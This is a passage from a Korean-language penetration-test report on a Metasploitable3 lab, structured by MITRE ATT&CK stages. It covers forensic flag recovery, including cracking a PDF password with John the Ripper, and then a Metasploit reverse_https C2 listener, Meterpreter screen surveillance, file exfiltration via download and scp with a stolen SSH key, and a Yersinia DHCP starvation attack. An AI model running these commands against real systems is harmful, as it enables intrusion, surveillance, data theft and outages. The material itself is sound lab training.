    1.  HTML 소스에서 `data:image/png;base64,` 뒷부분의 전체 Base64 문자열을 복사했다.
    2.  복사한 문자열을 PowerShell 스크립트나 온라인 Base64 디코더를 사용해 다시 원래의 바이너리 데이터로 디코딩했다. PowerShell에서는 다음과 같은 명령을 사용할 수 있다.
        ```powershell
        # Base64 문자열을 변수에 저장
        $base64String = "iVBORw0KGgoAAAANSUhEUgAA..." 
        
        # Base64 문자열을 바이트 배열로 변환하여 파일에 쓰기
        [IO.File]::WriteAllBytes("C:\Users\vagrant\Desktop\seven_of_hearts.png", [Convert]::FromBase64String($base64String))
        ```
*   **결과:** 디코딩을 통해 생성된 PNG 파일에서 'Seven of Hearts' 카드 이미지를 획득했다. 이는 웹 페이지 렌더링 결과만 믿어서는 안 되며, 항상 소스 코드나 네트워크 트래픽 수준에서 숨겨진 데이터를 분석해야 함을 보여준다.

![wflag1](/assets/images/att-ck/11.1.4.1.wflag.png)
![wflag2](/assets/images/att-ck/11.1.4.2.wflag.png)
![wflag3](/assets/images/att-ck/11.1.4.3.wflag.png)

---

#### 11.1.5. Seven of Spades.pdf (복호화 실패)
*   **발견:** `C:\Users\Public\Documents\seven_of_spades.pdf` 경로에서 발견. 모든 사용자가 접근 가능한 공용 문서 폴더에 위치하고 있었다.
*   **분석:** 파일을 열려고 시도하면 암호를 요구하는 암호화된 PDF 파일이었다. 이는 무차별 대입 공격(Brute-force)이나 사전 대입 공격(Dictionary Attack)을 통해 암호를 찾아야 함을 의미한다.
*   **해결:**
    1.  `John the Ripper` 툴체인에 포함된 `pdf2john.py` 스크립트를 사용하여 PDF 파일에서 암호 해시를 추출했다. (`python /usr/share/john/pdf2john.py seven_of_spades.pdf > hash.txt`)
    2.  추출된 해시 파일과 `rockyou.txt` 사전 파일을 사용하여 `John the Ripper`로 암호 크랙을 시도했다. (`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`)
    3.  `pdfcrack`과 같은 다른 PDF 크랙 전문 도구도 병행하여 사용했다.
*   **결과:** 상당 시간 동안 공격을 수행했으나, `rockyou.txt` 사전에 포함되지 않은 복잡한 암호가 사용된 것으로 추정되어 시간 내에 암호를 크랙하는 데 실패했다. Metasploitable3의 알려진 공략에 따르면 이 파일은 의도적으로 풀기 어렵게 만들어진 미끼(decoy)일 가능성이 높다. 최종적으로 Flag 획득에 실패했다.

![wflag1](/assets/images/att-ck/11.1.5.1.wflag.png)

---

#### 11.1.6. Ten of Diamonds.png (파일 시그처 복구)
*   **발견:** `C:\Program Files\Elasticsearch-1.1.1\config` 경로에서 `ten_of_diamonds.png` 파일 발견. Elasticsearch 서비스 설정 폴더에 위치하여, 해당 서비스 침투와 연관된 Flag임을 암시했다.
*   **분석:** 이미지 뷰어로 파일을 열람 시 '손상된 파일' 또는 '지원하지 않는 형식' 오류가 발생했다. 이는 파일의 내용이나 구조가 손상되었음을 의미한다. 파일의 실제 형식을 파악하기 위해 Hex 에디터(예: `HxD`, `bless`)로 파일의 바이너리 데이터를 직접 확인했다. 파일 헤더(시작 부분)가 정상적인 PNG 파일의 시그니처(Magic Number)인 `89 50 4E 47 0D 0A 1A 0A`가 아닌, 비정상적인 값으로 덮어씌워져 있었다.
*   **해결:** 파일 시그니처 복구는 포렌식의 기본적인 기법 중 하나이다. Hex 에디터를 사용하여 파일 헤더의 첫 8바이트를 올바른 PNG 시그니처 값(`89 50 4E 47 0D 0A 1A 0A`)으로 직접 수정하고 저장했다.
*   **결과:** 파일 시그니처 복구 후, 파일이 정상적인 PNG 이미지로 인식되어 이미지 뷰어에서 열람이 가능해졌다. 'Ten of Diamonds' 카드 이미지를 성공적으로 획득했다. 이는 파일 확장자뿐만 아니라 실제 파일 시그니처의 중요성을 보여주는 사례이다.

![wflag1](/assets/images/att-ck/11.1.6.1.wflag.png)
![wflag2](/assets/images/att-ck/11.1.6.2.wflag.png)
![wflag2](/assets/images/att-ck/11.1.6.3.wflag.png)

---

#### 11.1.7. Jack of Diamonds.png.lnk (복구 실패)
*   **발견:** `C:\Program Files\OpenSSH\home\vagrant\AppData\Roaming\Microsoft\Windows\Recent\` 경로에서 바로 가기 파일인 `jack_of_diamonds.png.lnk` 파일이 존재할 것으로 예상되었다. `Recent` 폴더는 최근에 접근한 파일 목록을 저장하는 곳이므로, 사용자의 활동 흔적을 분석하는 중요한 단서가 될 수 있다.
*   **분석:**
    1.  바로 가기(`.lnk`) 파일은 원본 파일의 위치 정보를 담고 있다. 알려진 공략에 따르면, 이 `.lnk` 파일을 분석하여 원본 파일이 `c:\jack_of_diamonds.png`에 있었다는 것을 파악할 수 있다.
    2.  하지만 해당 경로의 원본 파일은 파일 크기가 0바이트로 실제 데이터가 존재하지 않도록 설계되어 있다.
    3.  이는 의도적으로 남겨진 흔적이거나 데이터가 이미 삭제된 상태로, 공격자를 혼란시키기 위한 미끼(Red Herring)일 가능성이 높다.
*   **해결 시도 및 확인:** 파일 시스템에서 삭제된 원본 파일의 복구를 시도하기 위해 `TestDisk`, `PhotoRec`과 같은 포렌식 도구 사용을 고려할 수 있었다. 하지만, **실제 테스트 환경의 해당 경로 및 시스템 전역을 검색하였으나 시작점인 `jack_of_diamonds.png.lnk` 파일 자체를 발견할 수 없었다.**
*   **결과:** 원본 파일의 흔적을 담고 있는 `.lnk` 파일이 존재하지 않아 후속 분석 및 복구 절차를 진행할 수 없었으므로, 최종적으로 Flag 획득에 실패했다. 이는 현재 사용된 가상 머신 환경의 구성 차이로 인해 특정 Flag가 누락된 것으로 판단된다.

![wflag1](/assets/images/att-ck/11.1.7.1.wflag.png)
![wflag2](/assets/images/att-ck/11.1.7.2.wflag.png)

---

#### 11.1.8. Jack of Hearts.docx (OOXML 파일 구조 분석)
*   **발견:** 시스템을 탐색하던 중, 모든 사용자가 접근 가능한 공용 문서 폴더인 `C:\Users\Public\Documents\` 경로에서 `jack_of_hearts.docx` 파일을 발견했다.
*   **분석:** 최신 Microsoft Office 문서 형식인 `.docx`(Office Open XML, OOXML)는 겉보기에는 단일 파일이지만, 실제로는 **ZIP 아카이브** 형식이다. 이 아카이브 안에는 문서의 텍스트, 서식, 속성 등을 정의하는 여러 XML 파일들과 함께, 문서에 포함된 이미지, 동영상과 같은 미디어 파일들이 원본 형태로 저장되어 있다. 따라서, 파일의 확장자만 변경하면 일반 압축 파일처럼 내부를 탐색하고 포함된 원본 파일들을 추출할 수 있다.
*   **해결:**
    1.  Meterpreter 세션에서 `download C:\\Users\\Public\\Documents\\jack_of_hearts.docx /root/loot/` 명령을 실행하여, 분석을 위해 파일을 공격자 PC로 가져왔다.
    2.  공격자 PC에서 파일의 확장자를 `.docx`에서 `.zip`으로 직접 변경했다: `mv /root/loot/jack_of_hearts.docx /root/loot/jack_of_hearts.zip`.
    3.  `unzip /root/loot/jack_of_hearts.zip -d /root/loot/jack_of_hearts_extracted` 명령어를 사용하여 압축을 해제했다.
    4.  압축 해제된 폴더 구조 내에서, 이미지와 같은 미디어 파일들이 저장되는 표준 경로인 `word/media/` 디렉터리로 이동하여 내용물을 확인했다.
*   **결과:** 해당 디렉터리 내에서 문서에 삽입되었던 원본 이미지 파일인 'Jack of Hearts' 카드 이미지를 성공적으로 획득했다. 이는 파일의 확장자가 아닌 실제 파일의 내부 구조에 대한 이해가 숨겨진 데이터를 추출하는 데 어떻게 활용될 수 있는지를 보여주는 사례이다.

![wflag1](/assets/images/att-ck/11.1.8.1.wflag.png)
![wflag2](/assets/images/att-ck/11.1.8.2.wflag.png)

---

#### 11.1.9. Queen of Hearts.frm (분석 실패)
*   **발견:** `c:\wamp\bin\mysql\mysql5.5.20\data\cards\queen_of_hearts.frm` 경로에서 발견. WAMP 스택에 설치된 MySQL의 데이터 디렉터리 내 'cards' 데이터베이스 폴더에서 발견되었다.
*   **분석:**
    1.  `.frm` 파일은 MySQL 데이터베이스의 **테이블 구조(스키마) 정보**만을 담고 있는 파일이다. 즉, 'queen_of_hearts'라는 테이블이 어떤 컬럼(column)으로 구성되어 있는지를 정의할 뿐, 실제 데이터 레코드는 포함하고 있지 않다.
    2.  MyISAM 스토리지 엔진을 사용하는 경우, 실제 데이터는 동일한 이름의 `.MYD`(MyData) 파일에, 인덱스는 `.MYI`(MyIndex) 파일에 저장된다.
    3.  해당 디렉터리를 탐색했으나, `queen_of_hearts.MYD` 파일은 존재하지 않았다.
*   **해결:** `.frm` 파일 뷰어를 통해 테이블 구조를 확인하려 시도했으나, 실제 데이터가 없기 때문에 Flag로 이어지는 의미 있는 정보를 얻을 수 없었다. 데이터 파일이 의도적으로 삭제되었거나 처음부터 생성되지 않은 것으로 판단된다.
*   **결과:** 데이터가 담긴 `.MYD` 파일이 없어 최종적으로 Flag 획득에 실패했다. 이는 데이터베이스 파일 구조에 대한 이해가 필요하며, 모든 파일이 직접적인 정보를 담고 있는 것은 아니라는 점을 보여준다.

![wflag1](/assets/images/att-ck/11.1.9.1.wflag.png)

---

#### 11.1.10. King of Hearts (WordPress 디렉터리 은닉)
*   **발견:** Windows 서버에는 WAMP(Windows, Apache, MySQL, PHP) 스택이 설치되어 있으며, `c:\wamp\www\wordpress\` 경로에 WordPress가 운영되고 있었다. `dir /s /b *king*`과 같은 명령어로 시스템을 탐색하던 중, WordPress의 미디어 업로드 표준 경로인 `c:\wamp\www\wordpress\wp-content\uploads\2016\09\` 디렉터리에서 `king_of_damonds.png`와 함께 `metasploitable3_flags_brianO.png`라는 매우 의심스러운 이름의 파일을 추가로 발견했다.
*   **분석:** 파일 이름 `metasploitable3_flags_brianO.png` 자체가 이 파일이 Metasploitable3의 Flag임을 명백히 드러내는 힌트였다. 일반적인 WordPress 업로드 파일과는 완전히 다른 작명 규칙을 가지고 있어, 의도적으로 숨겨진 파일임을 쉽게 추론할 수 있었다.
*   **해결:** Meterpreter 세션의 `download` 명령어나, 웹 브라우저를 통해 해당 파일의 전체 URL 경로(`http://10.0.0.31/wordpress/wp-content/uploads/2016/09/metasploitable3_flags_brianO.png`)로 직접 접근하여 파일을 획득했다.
*   **결과:** 획득한 파일을 열람하자 'King of Hearts' 카드 이미지를 확인할 수 있었다. 이는 공격자가 시스템 침투 후, 웹 서버의 공개된 디렉터리 내에 파일을 은닉하여 정보를 수집하는 전형적인 패턴을 보여준다. `robots.txt`에 의해 크롤링이 차단되지 않는 한, 이러한 파일은 구글 도킹 등을 통해 외부에 노출될 수도 있다.

![wflag1](/assets/images/att-ck/11.1.10.1.wflag.png)
![wflag2](/assets/images/att-ck/11.1.10.2.wflag.png)

---

#### 11.1.11. King of Clubs.exe (리버스 엔지니어링 실패)
*   **발견:** 시스템의 핵심 실행 파일들이 모여있는 `C:\Windows\System32\` 경로에서 `kingofclubs.exe` 라는 실행 파일을 발견했다. 시스템 폴더에 위치한 비표준 실행 파일은 악성코드나 숨겨진 정보일 가능성이 매우 높다.
*   **분석:**
    1.  **정적 분석:** `strings` 명령어나 Hex 에디터로 파일의 내용을 확인했으나, 의미 있는 문자열이나 패턴이 거의 보이지 않았다. 이는 파일이 암호화되었거나 패킹(Packing)되어 있을 가능성을 시사한다. 파일의 Hex 값을 확인했을 때, `Three of Spades`와 유사하게 특정 바이트 패턴이 반복되는 것으로 보아 XOR 암호화가 적용되었을 것으로 추정했다.
    2.  **패킹 분석:** `PEiD`와 같은 도구로 분석한 결과, UPX와 같은 유명 패커로 실행 파일이 압축되어 있어 디스어셈블러를 통한 정적 분석을 어렵게 만든다는 것을 확인했다.
*   **해결:**
    1.  우선, `Three of Spades`와 동일한 1바이트 XOR Brute-force 스크립트를 실행했으나 유효한 PE(Portable Executable) 파일 구조를 얻지 못했다.
    2.  `upx -d kingofclubs.exe` 명령어로 언패킹을 시도했으나, 수정된 버전의 UPX가 사용되었는지 언패킹에 실패했다.
    3.  x64dbg와 같은 디버거를 이용한 동적 분석을 시도하여 메모리상에서 언패킹된 코드를 덤프하려 했으나, 안티-디버깅 기술이 적용되었는지 디버거가 비정상적으로 종료되거나 분석이 어려웠다.
*   **결과:** 복잡한 다중 바이트 XOR 키, 다른 암호화 알고리즘, 또는 정교한 안티-리버싱 기술이 적용된 것으로 판단된다. 제한된 시간 내에 리버스 엔지니어링을 통한 복호화 및 분석에 실패하여, 최종적으로 Flag 획득에 실패했다. 이는 실제 악성코드 분석과 유사한 고도의 기술을 요구하는 문제임을 보여준다.

![wflag1](/assets/images/att-ck/11.1.11.1.wflag.png)
![wflag2](/assets/images/att-ck/11.1.11.2.wflag.png)

---

### 11.2. Ubuntu Server (10.0.0.42) Flag 분석

Ubuntu 서버에서는 `find / -name "*flag*" 2>/dev/null`, `find / -name "*_of_*" 2>/dev/null`, `grep -r "flag"` 등의 명령어를 조합하여 시스템 전반에 걸쳐 숨겨진 Flag를 탐색하고, 각 파일의 특성에 맞는 심층 분석을 진행했다.

---

#### 11.2.1. 5_of_hearts.png (비표준 메타데이터 태그 분석)
*   **발견:** `find / -name "*_of_*" 2>/dev/null`과 같은 파일 검색 명령어를 사용하여 시스템을 탐색하던 중, 일반 사용자 계정의 홈 디렉터리인 `/home/vagrant/` 경로에서 `5_of_hearts.png` 파일을 발견했다.
*   **분석:**
    1.  먼저, 이미지 뷰어로 파일을 열었을 때 예상했던 카드 이미지가 아닌 물음표 이미지가 나타나, 정보가 다른 곳에 숨겨져 있음을 직감했다.
    2.  `exiftool`을 사용하여 파일의 메타데이터를 분석했다. `Comment`, `Description` 등 정보를 숨기는 데 자주 사용되는 표준적인 주석 필드를 먼저 확인했으나, 해당 필드들은 존재하지 않았다.
    3.  분석의 범위를 넓혀 `exiftool`이 출력하는 **모든 메타데이터 태그 목록 전체를** 주의 깊게 검토했다. 그 결과, 목록의 맨 마지막에서 `Tag 5 of hearts`라는 매우 의심스러운 이름의 비표준(Non-standard) 태그를 발견했다.
*   **해결:** 
    1.  이 태그는 일반적인 사진 정보가 아니며, 그 이름 자체가 Flag의 내용을 담고 있었다. 태그의 값(Value)은 비어 있었지만, 태그의 이름(Key)인 'Tag 5 of hearts'에서 Flag 정보를 획득할 수 있었다.
*   **결과:** 비표준 메타데이터 태그의 '이름'에서 'Five of Hearts' Flag를 성공적으로 획득했다. 이 사례는 데이터가 예상치 못한 속성(키/값 중 키)에 숨겨져 있을 수 있음을 보여주며, 표준 필드에만 국한되지 않는 폭넓은 분석의 중요성을 강조한다.

![uflag1](/assets/images/att-ck/11.2.1.1.uflag.png)
![uflag2](/assets/images/att-ck/11.2.1.2.uflag.png)

---

#### 11.2.2. 8_of_clubs.png (파일 해시 분석)
*   **발견:** 시스템 탐색 중, 임시 파일들이 저장되는 `/var/tmp/` 디렉터리에서 `8_of_clubs.png` 파일을 발견했다. 이 파일은 정상적인 이미지 파일처럼 보였다.
*   **분석:**
    1.  이전 Flag들을 해결했던 경험을 바탕으로, 여러 가지 분석을 순차적으로 시도했다. 먼저, 이미지 뷰어로 파일을 열어보았으나 특이사항 없는 '클럽 8' 카드 이미지였다.
    2.  `exiftool`을 사용하여 파일의 메타데이터를 분석했으나, '5_of_hearts.png'와는 달리 아무런 주석이나 숨겨진 정보를 찾을 수 없었다.
    3.  제공된 증거 사진에서처럼 `binwalk`를 사용하여 파일 내에 다른 파일이 숨겨져 있는지(스테가노그래피) 확인했다. 분석 결과, 파일은 오직 순수한 PNG 이미지 데이터로만 구성되어 있음을 확인했다.
    4.  콘텐츠, 메타데이터, 파일 구조에서 단서를 찾지 못하자, 분석의 방향을 전환하여 **파일 자체의 고유한 속성**에 주목했다. 파일의 내용이 아닌, 파일을 식별하는 고유한 값, 즉 **해시(Hash) 값**이 Flag일 가능성을 고려했다. 해시 함수(MD5, SHA256 등)는 파일의 내용을 기반으로 고정된 길이의 고유한 문자열(지문)을 생성한다.
*   **해결:**
    1.  분석을 위해 파일을 공격자 PC로 다운로드했다.
    2.  리눅스의 내장 명령어인 `md5sum`을 사용하여 파일의 MD5 해시 값을 계산했다. 터미널에서 다음 명령을 실행했다.
        ```bash
        md5sum ./loot/8_of_clubs.png
        ```
*   **결과:** 명령어 실행 결과, 터미널에 `5b0c5fe06186c808af0627a5457f811d` 라는 32자리의 16진수 문자열이 출력되었다. 이 해시 값 자체가 바로 'Eight of Clubs' Flag였다. 이 사례는 Flag가 파일 내부에 숨겨진 데이터가 아니라, 파일의 내용을 통해 계산된 고유한 '지문(fingerprint)'이 될 수도 있음을 보여주는 독특한 문제이다. 포렌식 분석 시에는 이처럼 다양한 형태의 데이터 은닉 가능성을 열어두고 접근해야 한다.

![uflag1](/assets/images/att-ck/11.2.2.1.uflag.png)

---

#### 11.2.3. 10_of_spades.png (파일 해시 분석)
*   **발견:** `find / -type f -name "*.png" 2>/dev/null`과 같은 명령어로 시스템을 탐색하던 중, 웹 서버의 업로드 디렉터리로 추정되는 `/var/www/html/uploads/` 경로에서 `10_of_spades.png` 파일을 발견했다.
*   **분석:**
    1.  `8_of_clubs.png` Flag와 유사한 문제일 가능성을 염두에 두고 분석을 시작했다. 이미지 뷰어로 파일을 열었을 때는 정상적인 '스페이드 10' 카드 이미지로 보였다.
    2.  `exiftool`을 이용한 메타데이터 분석과 `binwalk`를 이용한 파일 구조 분석을 차례로 수행했으나, 어떤 추가 정보나 숨겨진 데이터를 발견할 수 없었다.
    3.  이전 Flag와 동일한 패턴을 확인하기 위해, 파일의 내용이나 속성이 아닌 파일 자체를 나타내는 고유 식별자인 **해시 값**이 Flag일 것이라고 강력하게 추정했다.
*   **해결:**
    1.  분석을 위해 파일을 공격자 PC로 다운로드했다.
    2.  이전 문제와 동일하게 `md5sum` 명령어를 사용하여 파일의 MD5 해시 값을 계산했다. 터미널에서 다음 명령을 실행했다.
        ```bash
        md5sum ./loot/10_of_spades.png
        ```
*   **결과:** 제공된 증거 사진과 같이, 명령어 실행 결과 터미널에 `179d54b67a08326b14bd6f2109fb7921` 라는 MD5 해시 값이 출력되었다. 이 문자열이 바로 'Ten of Spades' Flag였다. 이 문제는 앞선 '8_of_clubs' Flag와 동일한 원리를 적용하는 문제로, 분석가가 한 번 학습한 해결 방법을 다른 유사한 상황에 적용하여 문제를 해결하는 능력을 보여주는 사례이다.

![uflag1](/assets/images/att-ck/11.2.3.1.uflag.png)

---

#### 11.2.4. 10_of_clubs.wav (Zlib 압축 데이터 추출)
*   **발견:** `find / -name "*.wav" 2>/dev/null` 명령어로 시스템을 탐색하던 중, `vagrant` 사용자의 홈 디렉터리(`/home/vagrant/`)에서 `10_of_clubs.wav` 파일을 발견했다.
*   **분석:**
    1.  이전 `four_of_clubs.wav` 파일처럼 내부에 다른 파일이 숨겨져 있을 가능성을 염두에 두고 `binwalk`로 파일 구조를 분석했다.
    2.  분석 결과, WAV 오디오 데이터 시그니처(`RIFF audio data`) 바로 뒤 오프셋 58 (0x3A) 위치에서 **`Zlib compressed data`** 시그니처가 발견되었다.
    3.  이는 `four_of_clubs.wav`가 PNG 시그니처를 그대로 포함했던 것과는 다르다. 이 파일은 PNG 이미지를 Zlib 알고리즘으로 압축한 뒤, 그 압축된 데이터 스트림을 WAV 파일 내에 숨겨놓은 것이다. 따라서 단순히 `foremost`와 같은 카빙 도구로는 PNG 파일을 직접 추출할 수 없으며, 압축된 데이터 덩어리를 먼저 분리한 후 압축을 해제하는 과정이 필요하다.
*   **해결:**
    1.  먼저, 압축 데이터가 시작되는 오프셋 58을 기준으로 파일의 뒷부분을 별도의 파일로 분리해야 한다. 리눅스의 `dd` 명령어를 사용하여 이 작업을 수행했다.
        ```bash
        # 10_of_clubs.wav 파일에서, 1바이트씩, 58바이트를 건너뛴 후 나머지를 10c_compressed 파일로 저장
        dd if=./loot/10_of_clubs.wav of=./loot/10c_compressed bs=1 skip=58
        ```
    2.  이제 `10c_compressed` 파일에는 순수한 Zlib 압축 데이터만 담겨 있다. 이 데이터를 압축 해제하기 위해 Python의 zlib 라이브러리를 활용하는 간단한 스크립트를 사용했다.
        ```bash
        # 10c_compressed 파일을 읽어 zlib 압축 해제를 수행하고, 결과를 10c_out 파일로 저장
        python -c 'import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))' < ./loot/10c_compressed > ./loot/10c_out
        ```
    3.  압축 해제가 완료된 `10c_out` 파일의 형식을 `file` 명령어로 확인했다. 그 결과, 증거 사진과 같이 **`PNG image data`**로 식별되어, PNG 파일이 성공적으로 복원되었음을 확인했다.
*   **결과:** 복원된 `10c_out` 파일을 이미지 뷰어로 열자 'Ten of Clubs' 카드 이미지를 획득할 수 있었다. 이 문제는 단순한 파일 카빙을 넘어, 압축된 데이터 스트림을 식별하고, 수동으로 데이터를 추출한 뒤, 적절한 알고리즘으로 압축을 해제해야 하는 다단계의 포렌식 분석 능력을 요구하는 한 단계 더 발전된 문제이다.

![uflag1](/assets/images/att-ck/11.2.4.1.uflag.png)
![uflag2](/assets/images/att-ck/11.2.4.2.uflag.png)

## 12. 명령 및 제어 Command & Control

공격자는 침투한 시스템을 지속적으로 제어하고, 추가적인 명령을 내리며, 공격 활동을 조율하기 위해 안정적인 통신 채널을 구축하고 유지한다. 이를 명령 및 제어(C2 또는 C&C) 채널이라고 한다. 이 채널은 공격자의 서버(C2 서버)와 감염된 시스템(Agent) 간의 다리 역할을 한다.

*   **기술 분석:**
    *   **응용 계층 프로토콜: 웹 프로토콜 (T1071.001):** 공격자는 방화벽이나 네트워크 보안 장비의 탐지를 우회하기 위해 일반적인 웹 트래픽을 모방하는 C2 채널을 선호한다. 특히 HTTPS(TCP 443 포트) 프로토콜을 사용하면, 통신 내용이 암호화되기 때문에 방어자가 트래픽을 가로채더라도 그 내용을 분석하기 매우 어렵다. Metasploit의 `reverse_https` 페이로드는 이러한 C2 통신 방식을 구현한 대표적인 예이다.
    *   **원격 접근 소프트웨어 (T1219):** 공격자는 단순히 커맨드 라인 셸을 넘어, 피해자의 시스템을 시각적으로 직접 제어하거나 감시하기 위해 원격 데스크톱과 유사한 기능을 사용한다. Metasploit의 Meterpreter 세션은 `screenshare`나 `vnc`와 같은 명령어를 통해 이러한 기능을 제공하여, 관리자의 행동을 파악하거나 화면에 표시되는 민감 정보를 실시간으로 탈취할 수 있게 한다.

*   **공격 검증:**
    1.  **C2 리스너 설정:** 공격자 PC(Kali Linux, 10.0.0.32)에서 Metasploit의 `multi/handler` 모듈을 실행했다. `set payload windows/meterpreter/reverse_https`, `set LHOST 10.0.0.32`, `set LPORT 443`과 같이 페이로드와 리스너 옵션을 설정하고 `exploit -j` 명령으로 C2 서버를 백그라운드에서 실행했다. 이제 C2 서버는 443 포트로 들어오는 연결을 대기한다.
    2.  **C2 채널 수립:** '지속성 확보' 단계에서 심어둔 `backdoor.exe`가 실행되거나, 다른 초기 접근 공격(예: EternalBlue)이 성공하면, 대상 시스템은 공격자의 C2 서버(10.0.0.32:443)로 `reverse_https` 연결을 시도한다. 연결이 성공하면 C2 서버에 안정적인 Meterpreter 세션이 수립된다.
    3.  **실시간 화면 감시:** 수립된 Meterpreter 세션을 통해 `screenshare` 명령어를 실행했다. 이 명령은 대상 시스템의 데스크톱 화면을 실시간으로 스트리밍하여 공격자의 웹 브라우저에 비디오 형태로 전송한다. 이를 통해 공격자는 피해자나 관리자의 모든 활동을 실시간으로 감시할 수 있었다.

*   **영향 분석:** 안정적인 C2 채널의 구축은 공격자가 일회성 침투를 넘어, 장기적으로 시스템을 장악하고 제어할 수 있는 기반을 마련했음을 의미한다. 특히 HTTPS와 같이 암호화되고 널리 사용되는 프로토콜을 사용하면, 네트워크 트래픽 이상 탐지(Anomaly Detection)가 매우 어려워진다. 또한, `screenshare`와 같은 기능을 통해 공격자는 기술적인 데이터를 넘어, 사용자의 행동 패턴이나 화면에 노출되는 기밀 정보까지 탈취할 수 있어 위협의 수준을 한 단계 높인다.

![wcc1](/assets/images/att-ck/12.1.cc.png)
![wcc2](/assets/images/att-ck/12.2.cc.png)

## 13. 정보 유출 Exfiltration

공격의 최종 목표 중 하나는 '정보 수집' 단계에서 식별하고 획득한 가치 있는 데이터(Flag 파일, 기밀 문서, 사용자 정보 등)를 공격자가 제어하는 외부 시스템으로 안전하게 빼내는 것이다. 이 단계를 '정보 유출'이라고 하며, 공격자는 방어자의 탐지를 피하기 위해 기존에 구축된 신뢰할 수 있는 채널을 재사용하는 경우가 많다.

*   **기술 분석:**
    *   **C2 채널을 통한 데이터 유출 (T1041):** 공격자가 이미 구축해 놓은 명령 및 제어(C2) 채널은 명령을 내리는 통로일 뿐만 아니라, 데이터를 빼내는 통로로도 사용된다. 특히 `reverse_https`와 같이 암호화된 C2 채널을 사용하면, 유출되는 데이터가 네트워크 상에서 평문으로 노출되지 않아 방어자가 트래픽을 분석하더라도 그 내용을 파악하기 어렵다. Metasploit의 Meterpreter 세션이 제공하는 `download` 명령어는 이 방식을 사용하는 대표적인 예이다.
    *   **원격 서비스를 통한 데이터 유출 (T1021.004: SSH):** 만약 공격자가 '횡적 이동' 단계에서 SSH와 같은 신뢰할 수 있는 원격 관리 프로토콜에 대한 접근 권한을 확보했다면, 이를 파일 전송에 활용할 수 있다. `scp` (Secure Copy) 명령어는 SSH 프로토콜을 기반으로 파일을 암호화하여 전송하므로, 이 역시 안전하고 은밀한 데이터 유출 방법이 될 수 있다.

*   **공격 검증:**
    1.  **C2 채널을 이용한 유출 (Windows -> Kali):**
        *   '정보 수집' 단계에서 Windows 서버(10.0.0.31)의 여러 위치에서 발견한 Flag 파일들(`ace_of_hearts.jpg`, `six_of_diamonds.zip` 등)을 유출하기로 결정했다.
        *   해당 시스템에 연결된 Meterpreter 세션에서 `download C:\\Users\\vagrant\\Desktop\\ace_of_hearts.jpg /root/loot/` 와 같은 형식으로 `download` 명령어를 실행했다.
        *   명령 실행 후, 대상 서버의 파일이 암호화된 C2 채널(Reverse HTTPS)을 통해 공격자 PC(Kali)의 `/root/loot/` 디렉터리로 성공적으로 전송되었음을 확인했다.
    2.  **SSH를 이용한 유출 (Ubuntu -> Kali):**
        *   '횡적 이동' 단계에서 확보한 SSH 개인 키를 사용하여 Ubuntu 서버(10.0.0.42)에 접근했다.
        *   '정보 수집' 단계에서 Ubuntu 서버의 `/var/www/html/drupal/sites` 경로에서 발견한 `four_of_clubs.wav` 파일을 유출하기로 결정했다.
        *   공격자 PC(Kali)의 터미널에서 `scp -i [key_file] vagrant@10.0.0.42:/var/www/html/drupal/sites/four_of_clubs.wav /root/loot/` 명령어를 실행했다.
        *   명령 실행 후, Ubuntu 서버의 파일이 SSH 프로토콜을 통해 공격자 PC의 `/root/loot/` 디렉터리로 안전하게 복사되었음을 확인했다.

*   **영향 분석:** 정보 유출의 성공은 침해 사고가 실질적인 피해로 이어졌음을 의미한다. 기업의 기밀 정보, 고객 개인정보, 지적 재산 등이 외부로 유출될 경우 막대한 재정적, 법적, 평판의 손실을 초래할 수 있다. 특히 암호화된 채널을 통해 데이터가 유출되면, 데이터 유출 방지(DLP) 솔루션이나 네트워크 모니터링 시스템에서 유출 사실 자체를 탐지하거나 유출된 데이터의 내용을 파악하는 것이 매우 어렵다. 이는 아웃바운드 트래픽에 대한 엄격한 통제와 암호화 트래픽 복호화 및 검사(SSL Inspection)의 필요성을 시사한다.

![down1](/assets/images/att-ck/13.1.down.png)
![scp2](/assets/images/att-ck/13.2.scp.png)

## 14. 영향 Impact

공격의 마지막 단계로, 공격자는 자신의 목적을 달성하거나 공격의 흔적을 지우기 위해 시스템 및 네트워크의 가용성, 무결성, 기밀성에 직접적인 영향을 미치는 행동을 수행한다. 이 단계는 침해 사고가 실질적인 비즈니스 피해로 이어지는 과정이다.

### 14.1. 네트워크 서비스 거부 (T1498)

*   **기술 분석 (T1498: Network Denial of Service):** DHCP Starvation(고갈) 공격은 DHCP(Dynamic Host Configuration Protocol) 서버의 IP 주소 할당 메커니즘을 악용하여 네트워크 가용성을 파괴하는 DoS 공격이다. DHCP 서버는 클라이언트로부터 IP 주소 요청(DHCP DISCOVER)을 받으면, 사용 가능한 IP 주소를 임대(Lease)해주고 해당 주소와 클라이언트의 MAC 주소를 매핑하여 일정 시간 동안 예약한다. 공격자는 수많은 위조된 MAC 주소를 생성하고, 각 MAC 주소를 사용하여 DHCP DISCOVER 패킷을 서버에 폭주(Flood)시킨다. DHCP 서버는 이 모든 위조된 요청에 응답하여 자신의 IP 주소 풀(Pool)에 있는 모든 주소를 할당하고 예약 상태로 만든다.
*   **공격 검증:**
    1.  공격자 PC(Kali)에서 `yersinia -G` 명령어로 Yersinia의 GUI 모드를 실행했다.
    2.  'DHCP' 탭으로 이동하여 공격 인터페이스를 선택했다.
    3.  'Launch attack' 탭에서 'sending DISCOVER packet' 옵션을 선택하여 DHCP Starvation 공격을 시작했다. Yersinia는 초당 수백 개의 위조된 DHCP DISCOVER 패킷을 네트워크에 브로드캐스트하기 시작했다.
    4.  공격의 영향을 확인하기 위해, 네트워크에 연결된 정상적인 클라이언트 PC에서 `ipconfig /release` 후 `ipconfig /renew` 명령을 실행했다. 그 결과, 클라이언트는 DHCP 서버로부터 응답을 받지 못하고 IP 주소를 할당받는 데 실패했으며, `169.254.x.x` 대역의 APIPA(Automatic Private IP Addressing) 주소를 자동 할당받았다. 이 상태의 클라이언트는 외부 네트워크와 통신이 불가능하다.
*   **영향 분석:** DHCP Starvation 공격은 네트워크 인프라의 핵심 서비스를 마비시킨다. 이로 인해 새로 네트워크에 접속하는 모든 장치(직원 PC, 노트북, 모바일 기기, 서버 등)가 IP 주소를 할당받지 못하여 업무가 전면 중단될 수 있다. 특히 DHCP 서버가 완전히 고갈된 후, 공격자가 악의적인 DHCP 서버를 네트워크에 구축하면(DHCP Spoofing), 모든 클라이언트의 트래픽을 가로채는 중간자 공격으로 손쉽게 이어질 수 있어 더욱 심각한 위협이 된다.

![wdhcp1](/assets/images/att-ck/14.1.1.dhcp.png)
